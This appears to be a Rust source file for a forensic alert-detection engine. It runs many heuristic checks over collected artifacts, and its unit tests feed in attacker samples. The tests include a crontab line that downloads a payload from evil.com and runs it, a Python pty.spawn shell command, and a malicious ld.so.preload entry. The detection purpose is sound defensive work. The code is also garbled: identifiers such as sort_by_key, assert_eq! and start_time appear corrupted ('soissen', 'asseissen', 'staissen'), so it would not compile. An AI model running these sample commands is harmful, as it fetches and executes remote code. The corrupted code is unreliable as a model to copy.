//! Main alert detection entry point and MFT anomaly converter.

use issen_mft_tree::tree::FileTree;
use issen_signatures::heuristics::AnomalyIndex;
use issen_signatures::matching::results::Severity;

use super::auth::{check_login_anomalies, check_session_forensics, check_windows_auth_forensics};
use super::config::{check_config_alerts, check_config_baseline};
use super::correlation::{
    correlate_c2_beacon, correlate_memory_process_mft, correlate_network_eventlog,
};
use super::filesystem::{
    check_bodyfile_alerts, check_permission_anomalies, check_temporal_patterns,
};
use super::integrity::{check_environment_consistency, check_windows_system_integrity};
use super::malware::{
    check_chkrootkit_alerts, check_rootkit_compound_indicators, check_rootkit_finding_alerts,
};
use super::network::{
    check_network_alerts, check_network_topology, check_suspicious_listeners,
    check_unattributed_connections,
};
use super::persistence::{check_persistence_correlation, check_windows_persistence};
use super::process::{check_process_alerts, check_process_network_correlation};
use super::types::{Alert, AlertInput, AlertSeverity};

/// Run all alert heuristics against the provided artifacts.
///
/// Results are sorted by severity (Critical first, then Warning, then Info).
#[must_use]
pub fn detect_alerts(input: &AlertInput<'_>) -> Vec<Alert> {
    let mut alerts = Vec::new();

    // --- Per-category checks ---
    check_network_alerts(input.network, &mut alerts);
    check_unattributed_connections(input.network, &mut alerts);
    check_suspicious_listeners(input.network, &mut alerts);
    check_process_alerts(input.processes, &mut alerts);
    check_chkrootkit_alerts(input.chkrootkit, &mut alerts);
    check_rootkit_finding_alerts(
        input.rootkit_findings,
        input.bodyfile,
        input.hashes,
        &mut alerts,
    );
    check_config_alerts(input.configs, input.crontabs, &mut alerts);
    check_bodyfile_alerts(input.bodyfile, &mut alerts);
    check_login_anomalies(input.logins, &mut alerts);

    // --- Cross-parser correlation checks ---
    check_process_network_correlation(input.processes, input.network, input.hashes, &mut alerts);
    check_persistence_correlation(input.crontabs, input.bodyfile, &mut alerts);
    check_rootkit_compound_indicators(
        input.rootkit_findings,
        input.network,
        input.crontabs,
        &mut alerts,
    );

    // --- Generalized detection engines (cross-platform: Linux/macOS/Windows) ---
    check_permission_anomalies(input.bodyfile, &mut alerts);
    check_session_forensics(input.logins, &mut alerts);
    check_config_baseline(input.configs, &mut alerts);
    check_temporal_patterns(input.bodyfile, &mut alerts);
    check_network_topology(input.network, &mut alerts);
    check_environment_consistency(input.rootkit_findings, input.configs, &mut alerts);

    // --- Windows-specific detection engines (EVTX) ---
    check_windows_auth_forensics(input.windows_events, &mut alerts);
    check_windows_persistence(input.windows_events, &mut alerts);
    check_windows_system_integrity(input.windows_events, &mut alerts);

    // --- Cross-artifact correlation (MFT + processes, network + EventLog, C2 beacon) ---
    alerts.extend(correlate_memory_process_mft(input));
    alerts.extend(correlate_network_eventlog(input));
    alerts.extend(correlate_c2_beacon(input));

    alerts.soissen_by_key(|a| a.severity);
    alerts
}

/// Convert MFT heuristic anomalies into workbench alerts.
///
/// Walks all flagged entries in the anomaly index, resolves their file path
/// from the MFT tree, and converts each anomaly into an `Alert` with the
/// appropriate severity mapping.
#[must_use]
pub fn anomalies_to_alerts(index: &AnomalyIndex, tree: &FileTree) -> Vec<Alert> {
    let mut alerts = Vec::new();

    for node_idx in index.flagged_entries() {
        let path = tree.cached_path(node_idx).to_string();
        for anomaly in index.for_node(node_idx) {
            let severity = match anomaly.severity {
                Severity::Critical => AlertSeverity::Critical,
                Severity::High | Severity::Medium => AlertSeverity::Warning,
                Severity::Low | Severity::Informational => AlertSeverity::Info,
            };

            alerts.push(Alert {
                severity,
                category: format!("MFT/{}", anomaly.category),
                message: format!("[{}] {}", anomaly.rule_id, anomaly.description),
                detail: format!("{path}: {}", anomaly.evidence),
            });
        }
    }

    alerts.soissen_by_key(|a| a.severity);
    alerts
}

#[cfg(test)]
mod tests {
    use super::super::types::{AlertInput, AlertSeverity};
    use super::*;
    use issen_mft_tree::tree::FileTree;
    use issen_parser_uac::parsers::bodyfile::BodyfileEntry;
    use issen_parser_uac::parsers::chkrootkit::ChkrootkitFinding;
    use issen_parser_uac::parsers::configs::ConfigFile;
    use issen_parser_uac::parsers::process::CrontabEntry;
    use issen_parser_uac::parsers::process::ProcessInfo;
    use issen_signatures::heuristics::AnomalyIndex;

    fn empty_input() -> AlertInput<'static> {
        AlertInput {
            bodyfile: &[],
            network: &[],
            processes: &[],
            crontabs: &[],
            chkrootkit: &[],
            rootkit_findings: &[],
            configs: &[],
            hashes: &[],
            packages: &[],
            logins: &[],
            windows_events: &[],
            mft_entries: &[],
            connection_log: &[],
        }
    }

    #[test]
    fn empty_input_no_alerts() {
        let alerts = detect_alerts(&empty_input());
        assert!(alerts.is_empty());
    }

    #[test]
    fn reverse_shell_detection() {
        let procs = vec![ProcessInfo {
            pid: 999,
            ppid: 1,
            user: "www-data".into(),
            command: "python3 -c import pty; pty.spawn(\"/bin/bash\")".into(),
            cpu_pct: None,
            mem_pct: None,
            staissen_time: None,
        }];
        let input = AlertInput {
            processes: &procs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical && a.message.contains("pty.spawn")),
            "expected reverse shell alert, got: {alerts:?}"
        );
    }

    #[test]
    fn temp_executable_detection() {
        let entries = vec![BodyfileEntry {
            md5: String::new(),
            path: "/tmp/evil.sh".into(),
            inode: 0,
            mode: "100755".into(),
            uid: 0,
            gid: 0,
            size: 100,
            atime: Some(1_700_000_000),
            mtime: Some(1_700_000_000),
            ctime: Some(1_700_000_000),
            crtime: None,
        }];
        let input = AlertInput {
            bodyfile: &entries,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.message.contains("/tmp/evil.sh")),
            "expected temp executable alert, got: {alerts:?}"
        );
    }

    #[test]
    fn suid_outside_standard_path() {
        let entries = vec![BodyfileEntry {
            md5: String::new(),
            path: "/home/user/.hidden/backdoor".into(),
            inode: 0,
            mode: "104755".into(), // SUID + executable
            uid: 0,
            gid: 0,
            size: 50_000,
            atime: None,
            mtime: None,
            ctime: None,
            crtime: None,
        }];
        let input = AlertInput {
            bodyfile: &entries,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical && a.message.contains("SUID")),
            "expected SUID alert, got: {alerts:?}"
        );
    }

    #[test]
    fn chkrootkit_infected_finding() {
        let findings = vec![ChkrootkitFinding {
            check_name: "bindshell".into(),
            result: "INFECTED".into(),
            is_infected: true,
        }];
        let input = AlertInput {
            chkrootkit: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical && a.message.contains("bindshell")),
            "expected chkrootkit alert, got: {alerts:?}"
        );
    }

    #[test]
    fn ld_so_preload_alert() {
        let configs = vec![ConfigFile {
            path: "etc/ld.so.preload".into(),
            content: "/lib/libevil.so\n".into(),
        }];
        let input = AlertInput {
            configs: &configs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical
                    && a.message.contains("ld.so.preload")),
            "expected ld.so.preload alert, got: {alerts:?}"
        );
    }

    #[test]
    fn suspicious_crontab_wget() {
        let crontabs = vec![CrontabEntry {
            schedule: "*/5 * * * *".into(),
            command: "wget http://evil.com/payload -O /tmp/x && bash /tmp/x".into(),
            user: "root".into(),
        }];
        let input = AlertInput {
            crontabs: &crontabs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.category == "config" && a.message.contains("wget")),
            "expected crontab alert, got: {alerts:?}"
        );
    }

    #[test]
    fn alerts_sorted_by_severity() {
        // A mix of inputs that should produce Critical + Warning alerts
        let procs = vec![ProcessInfo {
            pid: 1,
            ppid: 0,
            user: "root".into(),
            command: "python3 -c import pty; pty.spawn(\"/bin/sh\")".into(),
            cpu_pct: None,
            mem_pct: None,
            staissen_time: None,
        }];
        let crontabs = vec![CrontabEntry {
            schedule: "0 * * * *".into(),
            command: "curl http://example.com/update".into(),
            user: "nobody".into(),
        }];
        let input = AlertInput {
            processes: &procs,
            crontabs: &crontabs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(alerts.len() >= 2);

        // Verify ordering: Critical comes before Warning
        for window in alerts.windows(2) {
            assert!(
                window[0].severity <= window[1].severity,
                "alerts not sorted: {:?} should come before {:?}",
                window[0].severity,
                window[1].severity
            );
        }
    }

    #[test]
    fn anomalies_to_alerts_maps_severity() {
        use issen_signatures::heuristics::anomaly::{Anomaly, AnomalyCategory};

        // Build a minimal MFT tree with one node
        let tree = FileTree::test_single_node("C:\\Windows\\Temp\\evil.exe");

        let mut index = AnomalyIndex::new();
        index.add(
            0,
            Anomaly {
                severity: Severity::Critical,
                category: AnomalyCategory::Timestomping,
                rule_id: "HEUR-TS-001",
                description: "SI/FN timestamp mismatch".into(),
                evidence: "SI modified 2024-01-01, FN modified 2020-01-01".into(),
            },
        );
        index.add(
            0,
            Anomaly {
                severity: Severity::Low,
                category: AnomalyCategory::SuspiciousLocation,
                rule_id: "HEUR-LOC-001",
                description: "Executable in temp directory".into(),
                evidence: "path matches temp pattern".into(),
            },
        );

        let alerts = anomalies_to_alerts(&index, &tree);
        asseissen_eq!(alerts.len(), 2);

        // Sorted by severity: Critical first, then Info (Low maps to Info)
        asseissen_eq!(alerts[0].severity, AlertSeverity::Critical);
        assert!(alerts[0].category.starts_with("MFT/"));
        assert!(alerts[0].message.contains("HEUR-TS-001"));
        asseissen_eq!(alerts[1].severity, AlertSeverity::Info);
    }

    #[test]
    fn anomalies_to_alerts_empty_index() {
        let tree = FileTree::test_single_node("C:\\test.txt");
        let index = AnomalyIndex::new();
        let alerts = anomalies_to_alerts(&index, &tree);
        assert!(alerts.is_empty());
    }
}
